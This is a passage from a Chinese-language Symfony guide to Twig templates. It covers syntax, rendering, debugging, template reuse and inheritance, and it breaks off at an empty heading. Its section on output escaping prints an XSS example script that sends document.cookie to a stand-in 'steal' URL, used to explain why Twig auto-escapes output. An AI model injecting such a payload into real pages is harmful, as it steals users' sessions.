# 创建和使用模板

模板是在应用中组织和渲染 HTML 的最佳方式，无论你是需要从[控制器](/controller)渲染 HTML，还是生成[邮件内容](/mailer)。Symfony 中的模板使用 Twig 创建：一个灵活、快速且安全的模板引擎。

## 安装

在使用 [Symfony Flex](/setup#symfony-flex) 的应用中，运行以下命令来安装 Twig 语言支持及其与 Symfony 应用的集成：

```terminal
$ composer require symfony/twig-bundle
```

## Twig 模板语言

[Twig](https://twig.symfony.com) 模板语言允许你编写简洁、可读的模板，这些模板对网页设计师更友好，在许多方面比 PHP 模板更强大。请看下面这个 Twig 模板示例。即使是你第一次看到 Twig，你也可能理解大部分内容：

```html+twig
<!DOCTYPE html>
<html>
    <head>
        <title>Welcome to Symfony!</title>
    </head>
    <body>
        <h1>{{ page_title }}</h1>

        {% if user.isLoggedIn %}
            Hello {{ user.name }}!
        {% endif %}

        {# ... #}
    </body>
</html>
```

Twig 语法基于以下三个构造：

* `{{ ... }}`，用于显示变量的内容或对表达式求值的结果；
* `{% ... %}`，用于运行一些逻辑，例如条件语句或循环；
* `{# ... #}`，用于向模板添加注释（与 HTML 注释不同，这些注释不包含在渲染页面中）。

你不能在 Twig 模板中运行 PHP 代码，但 Twig 提供了在模板中运行一些逻辑的工具。例如，**过滤器**在渲染前修改内容，如 `upper` 过滤器将内容转换为大写：

```twig
{{ title|upper }}
```

Twig 默认提供了大量[标签（tags）](https://twig.symfony.com/doc/3.x/tags/index.html)、[过滤器（filters）](https://twig.symfony.com/doc/3.x/filters/index.html)和[函数（functions）](https://twig.symfony.com/doc/3.x/functions/index.html)。在 Symfony 应用中，你还可以使用 [Symfony 定义的 Twig 过滤器和函数](/reference/twig_reference)，并且可以[创建自己的 Twig 过滤器和函数](#templates-twig-extension)。

在 `prod` [环境](/configuration#configuration-environments)中，Twig 速度很快（因为模板被编译成 PHP 并自动缓存），但在 `dev` 环境中使用很方便（因为模板在你更改后会自动重新编译）。

### Twig 配置

Twig 有几个配置选项，用于定义数字和日期的显示格式、模板缓存等。请阅读 [Twig 配置参考](/reference/configuration/twig)以了解相关内容。

## 创建模板

在详细解释如何创建和渲染模板之前，先看下面这个示例，快速了解整个过程。首先，你需要在 `templates/` 目录中创建一个新文件来存储模板内容：

```html+twig
{# templates/user/notifications.html.twig #}
<h1>Hello {{ user_first_name }}!</h1>
<p>You have {{ notifications|length }} new notifications.</p>
```

然后，创建一个[控制器](/controller)来渲染该模板并向其传递所需变量：

```php
// src/Controller/UserController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class UserController extends AbstractController
{
    // ...

    public function notifications(): Response
    {
        // 以某种方式获取用户信息和通知
        $userFirstName = '...';
        $userNotifications = ['...', '...'];

        // 模板路径是从 `templates/` 开始的相对文件路径
        return $this->render('user/notifications.html.twig', [
            // 此数组定义传递给模板的变量，
            // 其中键是变量名，值是变量值
            // （Twig 推荐使用 snake_case 变量名：'foo_bar' 而不是 'fooBar'）
            'user_first_name' => $userFirstName,
            'notifications' => $userNotifications,
        ]);
    }
}
```

### 模板命名

Symfony 为模板名称推荐以下规范：

* 文件名和目录使用 [snake case](https://en.wikipedia.org/wiki/Snake_case)（例如 `blog_posts.html.twig`、`admin/default_theme/blog/index.html.twig` 等）；
* 文件名定义两个扩展名（例如 `index.html.twig` 或 `blog_posts.xml.twig`），第一个扩展名（`html`、`xml` 等）是模板将生成的最终格式。

尽管模板通常生成 HTML 内容，但它们可以生成任何基于文本的格式。这就是为什么双扩展名约定简化了为多种格式创建和渲染模板的方式。

### 模板位置

模板默认存储在 `templates/` 目录中。当服务或控制器渲染 `product/index.html.twig` 模板时，它们实际上是在引用 `<your-project>/templates/product/index.html.twig` 文件。

默认模板目录可以通过 [twig.default_path](/reference/configuration/twig#config-twig-default-path) 选项配置，你也可以添加更多模板目录，如本文[后面所述](#templates-namespaces)。

### 模板变量

模板的一个常见需求是打印从控制器或服务传入的变量值。变量通常存储对象和数组，而不是字符串、数字和布尔值。这就是为什么 Twig 提供了对复杂 PHP 变量的快速访问。考虑以下模板：

```html+twig
<p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>
```

`user.name` 符号表示你想显示存储在变量（`user`）中的某些信息（`name`）。`user` 是数组还是对象？`name` 是属性还是方法？在 Twig 中这无关紧要。

当使用 `foo.bar` 符号时，Twig 按以下顺序尝试获取变量的值：

1. `$foo['bar']`（数组和元素）；
2. `$foo->bar`（对象和公共属性）；
3. `$foo->bar()`（对象和公共方法）；
4. `$foo->getBar()`（对象和 *getter* 方法）；
5. `$foo->isBar()`（对象和 *isser* 方法）；
6. `$foo->hasBar()`（对象和 *hasser* 方法）；
7. 如果以上都不存在，使用 `null`（或者如果启用了 [strict_variables](/reference/configuration/twig#config-twig-strict-variables) 选项，则抛出 `Twig\Error\RuntimeError` 异常）。

这允许你在不必更改模板代码的情况下演进应用代码（你可以从数组变量开始进行应用概念验证，然后转向带有方法的对象等）。

### 链接到页面

不要手动编写链接 URL，而是使用 `path()` 函数基于[路由配置](/routing#routing-creating-routes)生成 URL。

之后，如果你想修改特定页面的 URL，你只需更改路由配置：模板会自动生成新的 URL。

考虑以下路由配置：

```php-attributes
// src/Controller/BlogController.php
namespace App\Controller;

// ...
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class BlogController extends AbstractController
{
    #[Route('/', name: 'blog_index')]
    public function index(): Response
    {
        // ...
    }

    #[Route('/article/{slug}', name: 'blog_post')]
    public function show(string $slug): Response
    {
        // ...
    }
}
```

```yaml
# config/routes.yaml
blog_index:
    path:       /
    controller: App\Controller\BlogController::index

blog_post:
    path:       /article/{slug}
    controller: App\Controller\BlogController::show
```

```php
// config/routes.php
namespace Symfony\Component\Routing\Loader\Configurator;

use App\Controller\BlogController;

return Routes::config([
    'blog_index' => [
        'path' => '/',
        'controller' => [BlogController::class, 'index'],
    ],
    'blog_post' => [
        'path' => '/article/{slug}',
        'controller' => [BlogController::class, 'show'],
    ],
]);
```

使用 `path()` Twig 函数链接到这些页面，将路由名称作为第一个参数，将路由参数作为可选的第二个参数：

```html+twig
<a href="{{ path('blog_index') }}">Homepage</a>

{# ... #}

{% for post in blog_posts %}
    <h1>
        <a href="{{ path('blog_post', {slug: post.slug}) }}">{{ post.title }}</a>
    </h1>

    <p>{{ post.excerpt }}</p>
{% endfor %}
```

`path()` 函数生成相对 URL。如果你需要生成绝对 URL（例如，在为邮件或 RSS 源渲染模板时），请使用 `url()` 函数，它与 `path()` 接受相同的参数（例如 `<a href="{{ url('blog_index') }}"> ... </a>`）。

### 链接到 CSS、JavaScript 和图片资源

如果模板需要链接到静态资源（例如图片），Symfony 提供了一个 `asset()` Twig 函数来帮助生成该 URL。首先，安装 `asset` 包：

```terminal
$ composer require symfony/asset
```

现在你可以使用 `asset()` 函数：

```html+twig
{# 图片位于 "public/images/logo.png" #}
<img src="{{ asset('images/logo.png') }}" alt="Symfony!">

{# CSS 文件位于 "public/css/blog.css" #}
<link href="{{ asset('css/blog.css') }}" rel="stylesheet">

{# JS 文件位于 "public/bundles/acme/js/loader.js" #}
<script src="{{ asset('bundles/acme/js/loader.js') }}"></script>
```

推荐使用 `asset()` 函数的原因如下：

* **资源版本化**：`asset()` 为资源 URL 追加版本哈希以破解缓存。这通过 [AssetMapper](/frontend) 和 [Asset 组件](/components/asset) 均可实现（另请参阅[资源配置选项](/reference/configuration/framework#reference-assets)，例如 `version` 和 `version_format`）。

* **应用可移植性**：无论你的应用托管在根目录（例如 `https://example.com`）还是子目录（例如 `https://example.com/my_app`），`asset()` 都会根据你的应用基本 URL 自动生成正确的路径（例如 `/images/logo.png` 对 `/my_app/images/logo.png`）。

如果你需要资源的绝对 URL，请使用 `absolute_url()` Twig 函数，如下所示：

```html+twig
<img src="{{ absolute_url(asset('images/logo.png')) }}" alt="Symfony!">

<link rel="shortcut icon" href="{{ absolute_url('favicon.png') }}">
```

### 构建、版本化及更高级的 CSS、JavaScript 和图片处理

如需以现代方式构建和版本化你的 JavaScript 和 CSS 资源，请阅读关于 [Symfony AssetMapper](/frontend) 的内容。

### App 全局变量

Symfony 创建了一个上下文对象，它会作为名为 `app` 的变量自动注入到每个 Twig 模板中。它提供对一些应用信息的访问：

```html+twig
<p>Username: {{ app.user.username ?? 'Anonymous user' }}</p>
{% if app.debug %}
    <p>Request method: {{ app.request.method }}</p>
    <p>Application Environment: {{ app.environment }}</p>
{% endif %}
```

`app` 变量（它是 `Symfony\Bridge\Twig\AppVariable` 的实例）使你可以访问以下变量：

`app.user`
: [当前用户对象](/security#create-user-class)，如果用户未经身份验证则为 `null`。

`app.request`
: 存储当前[请求数据](/http_foundation#accessing-request-data)的 `Symfony\Component\HttpFoundation\Request` 对象（根据你的应用，这可以是[子请求](/http_kernel#http-kernel-sub-requests)或常规请求）。

`app.session`
: 表示当前[用户会话](/session)的 `Symfony\Component\HttpFoundation\Session\Session` 对象，如果没有则为 `null`。

`app.flashes`
: 存储在会话中的所有[flash 消息](/controller#flash-messages)的数组。你也可以只获取某种类型的消息（例如 `app.flashes('notice')`）。

`app.environment`
: 当前[配置环境](/configuration#configuration-environments)的名称（`dev`、`prod` 等）。

`app.debug`
: 如果处于[调试模式](/configuration#debug-mode)则为 True，否则为 False。

`app.token`
: 表示安全令牌的 `Symfony\Component\Security\Core\Authentication\Token\TokenInterface` 对象。

`app.current_route`
: 与当前请求关联的路由名称，如果没有可用请求则为 `null`（相当于 `app.request.attributes.get('_route')`）。

`app.current_route_parameters`
: 传递给当前请求路由的参数数组，如果没有可用请求则为空数组（相当于 `app.request.attributes.get('_route_params')`）。

`app.locale`
: 在当前[语言环境切换器](/translation#locale-switcher)上下文中使用的语言环境。

`app.enabled_locales`
: 应用中启用的语言环境。

除了 Symfony 注入的全局 `app` 变量之外，你还可以自动将变量注入到所有 Twig 模板中，如下一节所述。

### 全局变量

Twig 允许你自动将一个或多个变量注入到所有模板中。这些全局变量在主 Twig 配置文件的 `twig.globals` 选项中定义：

```yaml
# config/packages/twig.yaml
twig:
    # ...
    globals:
        ga_tracking: 'UA-xxxxx-x'
```

```php
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'globals' => [
            'ga_tracking' => 'UA-xxxxx-x',
        ],
    ],
]);
```

现在，`ga_tracking` 变量在所有 Twig 模板中都可用，因此你可以在不必从渲染模板的控制器或服务中明确传递它的情况下使用它：

```html+twig
<p>The Google tracking code is: {{ ga_tracking }}</p>
```

除了静态值之外，Twig 全局变量还可以引用[服务容器](/service_container)中的服务。主要缺点是这些服务不会惰性加载。换句话说，一旦加载 Twig，你的服务就会被实例化，即使你从未使用过该全局变量：

```yaml
# config/packages/twig.yaml
twig:
    # ...
    globals:
        # 该值是以 '@' 为前缀的服务 ID
        uuid: '@App\Generator\UuidGenerator'
```

```php
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'globals' => [
            'uuid' => '@App\Generator\UuidGenerator',
        ],
    ],
]);
```

现在你可以在任何 Twig 模板中使用 `uuid` 变量来访问 `UuidGenerator` 服务：

```twig
UUID: {{ uuid.generate }}
```

## Twig 组件

Twig 组件是渲染模板的另一种方式，其中每个模板都绑定到一个"组件类"。这使得渲染和复用小型模板"单元"更加容易——如警告框、模态框标记或分类侧边栏。

更多信息，请参阅 [UX Twig Component](https://symfony.com/bundles/ux-twig-component/current/index.html)。

Twig 组件还有另一个超能力：它们可以变成"实时"的，当用户与它们交互时，它们会（通过 Ajax）自动更新。例如，当用户在输入框中输入内容时，你的 Twig 组件将通过 Ajax 重新渲染以显示结果列表！

要了解更多，请参阅 [UX Live Component](https://symfony.com/bundles/ux-live-component/current/index.html)。

## 渲染模板

### 在控制器中渲染模板

如果你的控制器继承自 [AbstractController](/controller#the-base-controller-class-services)，请使用 `render()` 辅助方法：

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    public function index(): Response
    {
        // ...

        // `render()` 方法返回一个包含模板创建的内容的 `Response` 对象
        return $this->render('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        // `renderView()` 方法只返回模板创建的内容，
        // 因此你可以在之后的 `Response` 对象中使用这些内容
        $contents = $this->renderView('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        return new Response($contents);
    }
}
```

如果你的控制器没有继承 `AbstractController`，你需要[在控制器中获取服务](/controller#controller-accessing-services)并使用 `twig` 服务的 `render()` 方法。

另一个选项是在控制器方法上使用 `#[Template]` 属性来定义要渲染的模板：

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product/index.html.twig')]
    public function index(): array
    {
        // ...

        // 当使用 #[Template] 属性时，你只需返回一个包含传递给模板的参数的数组
        // （该属性负责创建并返回 Response 对象）
        return [
            'category' => '...',
            'promotions' => ['...', '...'],
        ];
    }
}
```

[基础 AbstractController](/controller#the-base-controller-classes-services) 还提供了 `renderBlock()` 和 `renderBlockView()` 方法：

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    // ...

    public function price(): Response
    {
        // ...

        // `renderBlock()` 方法返回包含块内容的 `Response` 对象
        return $this->renderBlock('product/index.html.twig', 'price_block', [
            // ...
        ]);

        // `renderBlockView()` 方法只返回模板块创建的内容，
        // 因此你可以在之后的 `Response` 对象中使用这些内容
        $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [
            // ...
        ]);

        return new Response($contents);
    }
}
```

在处理[模板继承](#template_inheritance-layouts)中的块或使用 [Turbo Streams](https://symfony.com/bundles/ux-turbo/current/index.html) 时，这可能会很方便。

类似地，你可以在控制器上使用 `#[Template]` 属性来指定要渲染的块：

```php
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product.html.twig', block: 'price_block')]
    public function price(): array
    {
        return [
            // ...
        ];
    }
}
```

### 在服务中渲染模板

将 `twig` Symfony 服务注入到你自己的服务中，并使用其 `render()` 方法。当使用[服务自动装配](/service_container/autowiring)时，你只需在服务构造函数中添加一个参数，并使用 [Twig Environment](https://github.com/twigphp/Twig/blob/3.x/src/Environment.php) 进行类型提示：

```php
// src/Service/SomeService.php
namespace App\Service;

use Twig\Environment;

class SomeService
{
    public function __construct(
        private Environment $twig,
    ) {
    }

    public function someMethod(): void
    {
        // ...

        $htmlContents = $this->twig->render('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);
    }
}
```

### 在邮件中渲染模板

请阅读关于[邮件和 Twig 集成](/mailer#mailer-twig)的文档。

### 直接从路由渲染模板

尽管模板通常在控制器和服务中渲染，但你也可以直接从路由定义渲染不需要任何变量的静态页面。使用 Symfony 提供的特殊 `Symfony\Bundle\FrameworkBundle\Controller\TemplateController`：

```yaml
# config/routes.yaml
acme_privacy:
    path:          /privacy
    controller:    Symfony\Bundle\FrameworkBundle\Controller\TemplateController
    defaults:
        # 要渲染的模板路径
        template:  'static/privacy.html.twig'

        # 响应状态码（默认：200）
        statusCode: 200

        # Symfony 定义的特殊选项，用于设置页面缓存
        maxAge:    86400
        sharedAge: 86400

        # 缓存是否仅适用于客户端缓存
        private: true

        # 可选地，你可以定义一些传递给模板的参数
        context:
            site_name: 'ACME'
            theme: 'dark'

        # 可选地，你可以定义要添加到响应的 HTTP 头
        headers:
            Content-Type: 'text/html'
            foo: 'bar'
```

```php
// config/routes.php
namespace Symfony\Component\Routing\Loader\Configurator;

use Symfony\Bundle\FrameworkBundle\Controller\TemplateController;

return Routes::config([
    'acme_privacy' => [
        'path' => '/privacy',
        'controller' => TemplateController::class,
        'defaults' => [
            // 要渲染的模板路径
            'template'  => 'static/privacy.html.twig',

            // 响应状态码（默认：200）
            'statusCode' => 200,

            // Symfony 定义的特殊选项，用于设置页面缓存
            'maxAge'    => 86400,
            'sharedAge' => 86400,

            // 缓存是否仅适用于客户端缓存
            'private' => true,

            // 可选地，你可以定义一些传递给模板的参数
            'context' => [
                'site_name' => 'ACME',
                'theme' => 'dark',
            ],

            // 可选地，你可以定义要添加到响应的 HTTP 头
            'headers' => [
                'Content-Type' => 'text/html',
            ]
        ],
    ],
]);
```

### 检查模板是否存在

使用 [Twig 模板加载器](https://twig.symfony.com/doc/3.x/api.html#loaders)加载应用中的模板，该加载器也提供了检查模板是否存在的方法。首先，获取加载器：

```php
use Twig\Environment;

class YourService
{
    // 此代码假设你的服务使用自动装配来注入依赖项
    // 否则，手动注入名为 'twig' 的服务
    public function __construct(Environment $twig)
    {
        $loader = $twig->getLoader();
    }
}
```

然后，将 Twig 模板的路径传递给加载器的 `exists()` 方法：

```php
if ($loader->exists('theme/layout_responsive.html.twig')) {
    // 模板存在，执行某些操作
    // ...
}
```

## 调试模板

Symfony 提供了几个工具来帮助你调试模板中的问题。

### 检查 Twig 模板

`lint:twig` 命令检查你的 Twig 模板是否有语法错误。在将应用部署到生产环境之前运行它非常有用（例如在持续集成服务器中）：

```terminal
# 检查所有应用模板
$ php bin/console lint:twig

# 你也可以检查目录和单个模板
$ php bin/console lint:twig templates/email/
$ php bin/console lint:twig templates/article/recent_list.html.twig

# 你也可以显示模板中使用的废弃功能
$ php bin/console lint:twig --show-deprecations templates/email/

# 你也可以排除目录
$ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool
```

在 [GitHub Actions](https://docs.github.com/en/free-pro-team@latest/actions) 中运行检查器时，输出会自动适配 GitHub 所需的格式，但你也可以强制使用该格式：

```terminal
$ php bin/console lint:twig --format=github
```

### 检查 Twig 信息

`debug:twig` 命令列出关于 Twig 的所有可用信息（函数、过滤器、全局变量等）。检查你的[自定义 Twig 扩展](#templates-twig-extension)是否正常工作，以及检查[安装包](/setup#symfony-flex)时添加的 Twig 功能时，这非常有用：

```terminal
# 列出一般信息
$ php bin/console debug:twig

# 按任意关键字过滤输出
$ php bin/console debug:twig --filter=date

# 传入模板路径以显示将要加载的物理文件
$ php bin/console debug:twig @Twig/Exception/error.html.twig
```

### Dump Twig 工具

Symfony 提供了一个 [dump() 函数](/components/var_dumper#components-var-dumper-dump) 作为 PHP `var_dump()` 函数的改进替代品。此函数对于检查任何变量的内容非常有用，你也可以在 Twig 模板中使用它。

首先，确保应用中安装了 VarDumper 组件：

```terminal
$ composer require --dev symfony/debug-bundle
```

然后，根据你的需要使用 `{% dump %}` 标签或 `{{ dump() }}` 函数：

```html+twig
{# templates/article/recent_list.html.twig #}
{# 此变量的内容被发送到 Web Debug Toolbar，而不是转储到页面内容中 #}
{% dump articles %}

{% for article in articles %}
    {# 此变量的内容被转储到页面内容中，在网页上可见 #}
    {{ dump(article) }}

    {# 可选地，使用命名参数将它们显示为转储内容旁边的标签 #}
    {{ dump(blog_posts: articles, user: app.user) }}

    <a href="/article/{{ article.slug }}">
        {{ article.title }}
    </a>
{% endfor %}
```

为了避免泄露敏感信息，`dump()` 函数/标签只在 `dev` 和 `test` [配置环境](/configuration#configuration-environments)中可用。如果你尝试在 `prod` 环境中使用它，会看到 PHP 错误。

## 复用模板内容

### 包含模板

如果某些 Twig 代码在多个模板中重复出现，你可以将其提取到单个"模板片段"中，并在其他模板中包含它。想象一下，以下显示用户信息的代码在多个地方重复：

```html+twig
{# templates/blog/index.html.twig #}

{# ... #}
<div class="user-profile">
    <img src="{{ user.profileImageUrl }}" alt="{{ user.fullName }}">
    <p>{{ user.fullName }} - {{ user.email }}</p>
</div>
```

首先，创建一个名为 `blog/_user_profile.html.twig` 的新 Twig 模板（`_` 前缀是可选的，但这是一个用于更好区分完整模板和模板片段的约定）。

然后，从原始 `blog/index.html.twig` 模板中删除该内容，并添加以下内容来包含模板片段：

```twig
{# templates/blog/index.html.twig #}

{# ... #}
{{ include('blog/_user_profile.html.twig') }}
```

`include()` Twig 函数以要包含的模板路径作为参数。被包含的模板可以访问包含它的模板的所有变量（使用 [with_context](https://twig.symfony.com/doc/3.x/functions/include.html) 选项控制此行为）。

你也可以将变量传递给被包含的模板。例如，这对于重命名变量很有用。假设你的模板将用户信息存储在名为 `blog_post.author` 的变量中，而不是模板片段所期望的 `user` 变量。使用以下方法来*重命名*变量：

```twig
{# templates/blog/index.html.twig #}

{# ... #}
{{ include('blog/_user_profile.html.twig', {user: blog_post.author}) }}
```

### 嵌入控制器

[包含模板片段](#templates-include)对于在多个页面上复用相同内容非常有用。但是，在某些情况下，这种技术不是最好的解决方案。

想象一下，模板片段显示最近的三篇博客文章。为此，它需要进行数据库查询以获取这些文章。当使用 `include()` 函数时，你需要在每个包含该片段的页面上执行相同的数据库查询。这不是很方便。

更好的替代方案是使用 `render()` 和 `controller()` Twig 函数**嵌入执行某个控制器的结果**。

首先，创建渲染一定数量最近文章的控制器：

```php
// src/Controller/BlogController.php
namespace App\Controller;

use Symfony\Component\HttpFoundation\Response;
// ...

class BlogController extends AbstractController
{
    public function recentArticles(int $max = 3): Response
    {
        // 以某种方式获取最近文章（例如进行数据库查询）
        $articles = ['...', '...', '...'];

        return $this->render('blog/_recent_articles.html.twig', [
            'articles' => $articles
        ]);
    }
}
```

然后，创建 `blog/_recent_articles.html.twig` 模板片段（模板名称中的 `_` 前缀是可选的，但这是一个用于更好区分完整模板和模板片段的约定）：

```html+twig
{# templates/blog/_recent_articles.html.twig #}
{% for article in articles %}
    <a href="{{ path('blog_show', {slug: article.slug}) }}">
        {{ article.title }}
    </a>
{% endfor %}
```

现在你可以在任何模板中调用此控制器来嵌入其结果：

```html+twig
{# templates/base.html.twig #}

{# ... #}
<div id="sidebar">
    {# 如果控制器与路由关联，使用 path() 或 url() 函数 #}
    {{ render(path('latest_articles', {max: 3})) }}
    {{ render(url('latest_articles', {max: 3})) }}

    {# 如果你不想通过公共 URL 暴露控制器，
       使用 controller() 函数来定义要执行的控制器 #}
    {{ render(controller(
        'App\\Controller\\BlogController::recentArticles', {max: 3}
    )) }}
</div>
```

当使用 `controller()` 函数时，控制器不是通过常规 Symfony 路由访问的，而是通过专门用于服务这些模板片段的特殊 URL。在 `fragments` 选项中配置该特殊 URL：

```yaml
# config/packages/framework.yaml
framework:
    # ...
    fragments: { path: /_fragment }
```

```php
// config/packages/framework.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'framework' => [
        // ...
        'fragments' => [
            'path' => '/_fragment',
        ],
    ],
]);
```

> **警告：** 嵌入控制器需要向这些控制器发出请求并将某些模板渲染为结果。如果你嵌入大量控制器，这可能会对应用性能产生重大影响。如果可能，请[缓存模板片段](/http_cache/esi)。

## 如何使用 hinclude.js 嵌入异步内容

模板还可以使用 `hinclude.js` JavaScript 库异步嵌入内容。

首先，通过从模板[链接到资源](#templates-link-to-assets)或使用 [AssetMapper](/frontend) 将其添加到应用的 JavaScript 中，在你的页面中包含 [hinclude.js](https://mnot.github.io/hinclude/) 库。

由于嵌入的内容来自另一个页面（或控制器），Symfony 使用标准 `render()` 函数的一个版本来配置模板中的 `hinclude` 标签：

```twig
{{ render_hinclude(controller('...')) }}
{{ render_hinclude(url('...')) }}
```

> **注意：** 当使用 `controller()` 函数时，你还必须配置 [fragments path 选项](#fragments-path-config)。

当 JavaScript 被禁用或加载时间过长时，你可以通过渲染某个模板来显示默认内容：

```yaml
# config/packages/framework.yaml
framework:
    # ...
    fragments:
        hinclude_default_template: hinclude.html.twig
```

```php
// config/packages/framework.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'framework' => [
        // ...
        'fragments' => [
            'hinclude_default_template' => 'hinclude.html.twig',
        ],
    ],
]);
```

你可以为每个 `render()` 函数定义默认模板（这将覆盖任何已定义的全局默认模板）：

```twig
{{ render_hinclude(controller('...'),  {
    default: 'default/content.html.twig'
}) }}
```

或者你也可以指定一个字符串作为默认内容：

```twig
{{ render_hinclude(controller('...'), {default: 'Loading...'}) }}
```

使用 `attributes` 选项来定义 hinclude.js 选项的值：

```twig
{# 默认情况下，跨站请求不使用凭据（如 Cookie、授权头或 TLS 客户端证书）；
   将此选项设置为 'true' 可使用它们 #}
{{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}

{# 默认情况下，不运行加载内容中包含的 JavaScript 代码；
   将此选项设置为 'true' 可运行该 JavaScript 代码 #}
{{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}
```

## 模板继承和布局

随着应用的增长，你会发现页面之间越来越多的重复元素，如页眉、页脚、侧边栏等。[包含模板](#templates-include)和[嵌入控制器](#templates-embed-controllers)可以提供帮助，但当页面共享公共结构时，最好使用**继承**。

[Twig 模板继承](https://twig.symfony.com/doc/3.x/tags/extends.html)的概念与 PHP 类继承类似。你定义一个父模板，其他模板可以从中继承，子模板可以覆盖父模板的部分内容。

Symfony 为中等和复杂的应用推荐以下三级模板继承：

* `templates/base.html.twig`，定义所有应用模板的公共元素，如 `<head>`、`<header>`、`<footer>` 等；
* `templates/layout.html.twig`，继承自 `base.html.twig`，定义在所有或大多数页面中使用的内容结构，如两列内容 + 侧边栏布局。应用的某些部分可以定义自己的布局（例如 `templates/blog/layout.html.twig`）；
* `templates/*.html.twig`，应用页面，继承自主 `layout.html.twig` 模板或任何其他部分布局。

在实践中，`base.html.twig` 模板看起来像这样：

```html+twig
{# templates/base.html.twig #}
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>{% block title %}My Application{% endblock %}</title>
        {% block stylesheets %}
            <link rel="stylesheet" type="text/css" href="/css/base.css">
        {% endblock %}
    </head>
    <body>
        {% block body %}
            <div id="sidebar">
                {% block sidebar %}
                    <ul>
                        <li><a href="{{ path('homepage') }}">Home</a></li>
                        <li><a href="{{ path('blog_index') }}">Blog</a></li>
                    </ul>
                {% endblock %}
            </div>

            <div id="content">
                {% block content %}{% endblock %}
            </div>
        {% endblock %}
    </body>
</html>
```

[Twig block 标签](https://twig.symfony.com/doc/3.x/tags/block.html)定义可以在子模板中被覆盖的页面部分。它们可以是空的（如 `content` 块），也可以定义默认内容（如 `title` 块），当子模板不覆盖它们时将显示默认内容。

`blog/layout.html.twig` 模板可能如下所示：

```html+twig
{# templates/blog/layout.html.twig #}
{% extends 'base.html.twig' %}

{% block content %}
    <h1>Blog</h1>

    {% block page_contents %}{% endblock %}
{% endblock %}
```

该模板继承自 `base.html.twig`，只定义了 `content` 块的内容。父模板的其余块将显示其默认内容。但是，它们可以被第三级继承模板覆盖，例如 `blog/index.html.twig`，它显示博客索引：

```html+twig
{# templates/blog/index.html.twig #}
{% extends 'blog/layout.html.twig' %}

{% block title %}Blog Index{% endblock %}

{% block page_contents %}
    {% for article in articles %}
        <h2>{{ article.title }}</h2>
        <p>{{ article.body }}</p>
    {% endfor %}
{% endblock %}
```

该模板继承自第二级模板（`blog/layout.html.twig`），但覆盖了不同父模板的块：来自 `blog/layout.html.twig` 的 `page_contents` 和来自 `base.html.twig` 的 `title`。

当你渲染 `blog/index.html.twig` 模板时，Symfony 使用三个不同的模板来创建最终内容。这种继承机制提升了你的生产效率，因为每个模板只包含其独特内容，并将重复内容和 HTML 结构留给某些父模板。

> **警告：** 使用 `extends` 时，禁止子模板在块之外定义模板部分。以下代码会抛出 `SyntaxError`：
>
> ```html+twig
> {# templates/blog/index.html.twig #}
> {% extends 'base.html.twig' %}
>
> {# 以下行没有被 "block" 标签捕获 #}
> <div class="alert">Some Alert</div>
>
> {# 以下是有效的 #}
> {% block content %}My cool blog posts{% endblock %}
> ```

阅读 [Twig 模板继承](https://twig.symfony.com/doc/3.x/tags/extends.html)文档，以了解更多关于在覆盖模板时如何复用父块内容以及其他高级功能。

## 输出转义和 XSS 攻击

想象一下，你的模板包含 `Hello {{ name }}` 代码来显示用户名，而一个恶意用户将以下内容设置为他们的名字：

```html
My Name
<script type="text/javascript">
    document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
</script>
```

你会在屏幕上看到 `My Name`，但攻击者刚刚秘密窃取了你的 Cookie，因此他们可以在其他网站上冒充你。这被称为[跨站脚本（Cross-Site Scripting）](https://en.wikipedia.org/wiki/Cross-site_scripting)或 XSS 攻击。

为了防止此攻击，使用*"输出转义"*来转换具有特殊含义的字符（例如，用 `&lt;` HTML 实体替换 `<`）。Symfony 应用默认是安全的，因为它们执行自动输出转义：

```html+twig
<p>Hello {{ name }}</p>
{# 如果 'name' 是 '<script>alert('hello!')</script>'，Twig 将输出：
   '<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}
```

如果你要渲染的变量是可信的并且包含 HTML 内容，请使用 [Twig raw 过滤器](https://twig.symfony.com/doc/3.x/filters/raw.html)来禁用该变量的输出转义：

```html+twig
<h1>{{ product.title|raw }}</h1>
{# 如果 'product.title' 是 'Lorem <strong>Ipsum</strong>'，Twig 将完全输出该内容，
   而不是输出 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}
```

阅读 [Twig 输出转义文档](https://twig.symfony.com/doc/3.x/api.html#escaper-extension)以了解更多关于如何禁用块甚至整个模板的输出转义。

## 模板命名空间

